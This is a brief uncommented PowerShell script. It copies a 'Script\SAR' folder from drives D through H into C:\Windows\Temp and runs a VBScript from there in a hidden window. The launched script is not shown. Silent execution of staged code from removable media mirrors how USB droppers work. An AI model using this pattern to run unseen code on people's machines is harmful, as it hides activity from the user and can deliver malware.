$driveLetters = "D", "E", "F", "G", "H"
$destination = "C:\Windows\Temp\"

foreach ($letter in $driveLetters) {
    $sourcePath = "${letter}:\Script\SAR"
    if (Test-Path $sourcePath) {
        Copy-Item -Path $sourcePath -Destination $destination -Recurse
    }
}

Start-Process -FilePath "C:\Windows\Temp\SAR\v.vbs" -WindowStyle Hidden
